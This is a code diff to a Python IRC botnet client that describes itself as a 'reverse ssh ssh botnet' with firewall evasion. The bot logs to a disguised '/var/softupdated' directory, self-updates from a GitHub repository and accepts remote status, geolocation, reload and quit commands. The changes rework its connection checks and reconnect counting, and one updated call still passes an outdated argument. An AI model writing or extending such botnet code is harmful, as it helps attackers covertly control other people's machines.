@@ -29,7 +29,7 @@ from modules.logging import logfile, log
 #       openvpn     implement openvpn for firewall evasion
 #       reverse ssh ssh botnet implementation
 
-version = "7.5a"                                                                 # bot version
+version = "7.5"                                                                 # bot version
 
 try:
     logfile(filename="/var/softupdated/bot_v%s(%s).log" % (version, strftime("%m-%d|%H:%M")))                  # redirects bot output to logfile
@@ -185,20 +185,24 @@ def reload_bot():
     sys.exit()
 
 def still_connected(irc):
-    signal.signal(signal.SIGALRM, timeout_handler)
-    signal.alarm(2)
     try:
-        irc.send('PING TEST')
-        data = irc.recv(4096)
+        log('[#] Testing Connection.')
+        log('[>] Sent:')
+        log('[>]    PING TEST')
+        sent_time = time.time()
+        irc.send('PING :TEST\r\n')
+        data = irc.recv(1024)
+        latency = str(round((time.time() - sent_time)*1000, 2))+"ms"
+        log('[<] Recieved:')
+        log('[>]    %s' % data.strip())
+        log('[#] Latency: %s' % latency)
         if data.find('PONG') == -1:
             raise Exception("PING/PONG FAILED")
         else:
-            signal.alarm(0)
-            return True
+            return (True, latency)
     except Exception as exit_exception:
         log("[X] Disconnected, PING failed after socket disconnected: %s" % exit_exception)
-        signal.alarm(0)
-        return False
+        return (False, "X")
 
 ############ Keyword functions
 
@@ -484,17 +488,11 @@ def selfupdate(git_user="nikisweeting",git_repo="python-medusa"):               
     sleep(3)
     reload_bot()
 
-def status_report(connection_time, timeout_count, last_ping):
+def status_report(irc, connection_time, reconnects, last_ping):
     ping = round(time.time() - last_ping, 1)
     connected = round(time.time() - connection_time, 1)
-
-    cmd = "ping -q -c2 %s | tail -1 | awk '{print $4}' | cut -d '/' -f 2" % server
-    try:
-        ping_speed = os.popen(cmd).read().strip()
-    except Exception as ping_error:
-        ping_speed = ping_error
-
-    return "[v%s] connected[%ss] net_errors[%s] last_ping[%ss ago] avg_ping[%sms]" % (version, connected, timeout_count, ping, ping_speed)
+    ping_speed = still_connected(irc)[1]
+    return "[v%s] connected[%ss] reconnects[%s] last_ping[%ss ago] ping_speed[%s]" % (version, connected, reconnects, ping, ping_speed)
 
 def admin(admins):
     for entry in admins:
@@ -511,6 +509,7 @@ if __name__ == '__main__':
     last_ping = time.time()                                                     # last ping recieved
     threshold = 8 * 60                                                          # maximum time between pings before assuming disconnected (in seconds)
     quit_status = False
+    reconnects = -1
 
     while not quit_status:
         signal.signal(signal.SIGTERM, sigterm_handler)
@@ -525,6 +524,7 @@ if __name__ == '__main__':
                 irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 irc.settimeout(60)                                              # timeout for irc.recv
                 irc.connect((server, port))
+                reconnects += 1
                 connection_time = time.time()
                 recv = irc.recv(4096)
                 log("[+] Recieved:    ", recv+'\n')
@@ -615,7 +615,7 @@ if __name__ == '__main__':
                             reload_bot()
 
                         elif content == '!status':
-                            broadcast(status_report(connection_time, timeout_count, last_ping))
+                            broadcast(status_report(irc, connection_time, timeout_count, last_ping))
 
                         elif content == '!geo':
                             location = str(geo_locate())
@@ -689,11 +689,8 @@ if __name__ == '__main__':
                         elif content == 'reload':
                             reload_bot()
 
-                        elif content == 'check':
-                            privmsg(str(still_connected(irc)))
-
                         elif content == 'status':
-                            privmsg(status_report(connection_time, timeout_count, last_ping))
+                            privmsg(status_report(irc, connection_time, reconnects, last_ping))
 
                         elif content == 'geo':
                             location_with_proxy = str(geo_locate(with_proxy=True))
@@ -770,7 +767,7 @@ if __name__ == '__main__':
                                 privmsg("[X]: %s" % python_exception, return_to)
 
         except (KeyboardInterrupt, SystemExit) as quit_reason:
-            privmsg('Quitting due to KeyboardInterrupt/SystemExit: %s' % quit_reason)
+            privmsg('Quitting Intentionally. %s' % quit_reason)
             irc.send('QUIT\r\n')
             break
         except Exception as exit_exception:
